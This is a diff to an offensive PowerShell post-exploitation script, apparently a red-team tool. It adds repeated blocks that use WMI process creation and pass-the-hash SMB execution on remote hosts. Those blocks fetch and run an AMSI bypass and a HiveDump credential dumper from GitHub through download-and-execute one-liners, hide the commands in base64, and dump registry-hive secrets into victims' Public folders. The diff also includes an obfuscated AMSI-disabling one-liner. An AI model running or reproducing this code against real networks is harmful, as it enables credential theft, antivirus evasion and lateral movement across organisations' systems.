@@ -1531,6 +1531,8 @@ Write-Host "#" -ForegroundColor Red;
 Write-Host "######################"
 Write-Host ""
 
+<#
+
 # Dumping SAM from remote
 
 if($Username.Contains(".\") -AND $HASHorPassword -eq "HASH"){}
@@ -1539,20 +1541,20 @@ else{
 	Write-Host "Attempting to dump SAM from targets..." -ForegroundColor Yellow
 	#iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1") > $null
 	#iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')
-	<# $PwshModule = (Get-Module)
-	if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
-	else{
-		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
-		Import-ActiveDirectory
-	} #>
+	#$PwshModule = (Get-Module)
+	#if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
+	#else{
+	#	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
+	#	Import-ActiveDirectory
+	#}
 
 	$SAMTargets = $null
 	$SAMTargets = $WMITargets
 	
-	<# $DomainControllers = (Get-ADDomainController | Select-Object -ExpandProperty Name)
-	foreach($DomainController in $DomainControllers){
-		$SAMTargets = ($SAMTargets | Where-Object {$_ -notlike "$DomainController*"})
-	} #>
+	#$DomainControllers = (Get-ADDomainController | Select-Object -ExpandProperty Name)
+	#foreach($DomainController in $DomainControllers){
+	#	$SAMTargets = ($SAMTargets | Where-Object {$_ -notlike "$DomainController*"})
+	#}
 	
 	if($Username){
 
@@ -1607,6 +1609,8 @@ else{
 	Write-Host ""
 }
 
+#>
+
 ######### Dumping Tickets and Hashes from targets
 
 Write-Host "Dumping Tickets and Hashes from targets..." -ForegroundColor Yellow
@@ -1635,6 +1639,28 @@ if($Username){
 				Start-Sleep 1
 				
 				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
+				$processCommand2 = "powershell.exe -Command $Command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+				
+				Start-Sleep 2
+				
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/HiveDump.ps1`"); Invoke-HiveDump >> c:\Users\Public\$eightrandom\$_.txt"
+		
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp2.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp2.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
 				
 				$processCommand2 = "powershell.exe -Command $Command2"
 				
@@ -1700,6 +1726,28 @@ if($Username){
 				Start-Sleep 1
 				
 				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
+				$processCommand2 = "powershell.exe -Command $Command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+				
+				Start-Sleep 2
+				
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/HiveDump.ps1`"); Invoke-HiveDump >> c:\Users\Public\$eightrandom\$_.txt"
+		
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp2.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp2.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
 				
 				$processCommand2 = "powershell.exe -Command $Command2"
 				
@@ -1764,16 +1812,30 @@ if($Username){
 				
 				$base64command3 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode2))
 				
+				$commandtoencode3 = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/HiveDump.ps1`"); Invoke-HiveDump >> c:\Users\Public\$eightrandom\$_.txt"
+		
+				$base64command4 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode3))
+				
+				$FullCommand2 = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp2.txt`" -Value $base64command4"
+				
+				$base64command5 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand2))
+				
+				$FinalCommand2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp2.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
 				Start-Job -ScriptBlock {
-					param($pwd, $base64command2, $FinalCommand, $base64command3, $SMBExecUsername, $DomainHASH, $WMITarget)
+					param($pwd, $base64command2, $FinalCommand, $base64command5, $FinalCommand2, $base64command3, $SMBExecUsername, $DomainHASH, $WMITarget)
 					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
 					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command2"
 					Start-Sleep 1
 					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -Command $FinalCommand"
 					Start-Sleep 2
+					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command5"
+					Start-Sleep 1
+					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -Command $FinalCommand2"
+					Start-Sleep 2
 					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command3"
-				} -ArgumentList $pwd, $base64command2, $FinalCommand, $base64command3, $SMBExecUsername, $DomainHASH, $_
+				} -ArgumentList $pwd, $base64command2, $FinalCommand, $base64command5, $FinalCommand2, $base64command3, $SMBExecUsername, $DomainHASH, $_
 			}
 
 			Wait-Job $dumpinghashesjob > $null
@@ -1831,6 +1893,28 @@ if($Username){
 				Start-Sleep 1
 				
 				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
+				$processCommand2 = "powershell.exe -Command $Command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+				
+				Start-Sleep 2
+				
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/HiveDump.ps1`"); Invoke-HiveDump >> c:\Users\Public\$eightrandom\$_.txt"
+		
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp2.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp2.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
 				
 				$processCommand2 = "powershell.exe -Command $Command2"
 				
@@ -1909,6 +1993,28 @@ if($Username){
 			
 			Start-Sleep 2
 			
+			$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/HiveDump.ps1`"); Invoke-HiveDump >> c:\Users\Public\$eightrandom\$_.txt"
+		
+			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+			
+			$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp2.txt`" -Value $base64command"
+			
+			$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+			
+			$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+			
+			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+			
+			Start-Sleep 1
+			
+			$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp2.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+			
+			$processCommand2 = "powershell.exe -Command $Command2"
+			
+			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+			
+			Start-Sleep 2
+			
 			$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 			
 			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
@@ -1972,6 +2078,28 @@ else{
 		Start-Sleep 1
 		
 		$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+		
+		$processCommand2 = "powershell.exe -Command $Command2"
+		
+		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+		
+		Start-Sleep 2
+		
+		$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/HiveDump.ps1`"); Invoke-HiveDump >> c:\Users\Public\$eightrandom\$_.txt"
+		
+		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+		
+		$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp2.txt`" -Value $base64command"
+		
+		$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+		
+		$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+		
+		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+		
+		Start-Sleep 1
+		
+		$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp2.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
 		
 		$processCommand2 = "powershell.exe -Command $Command2"
 		
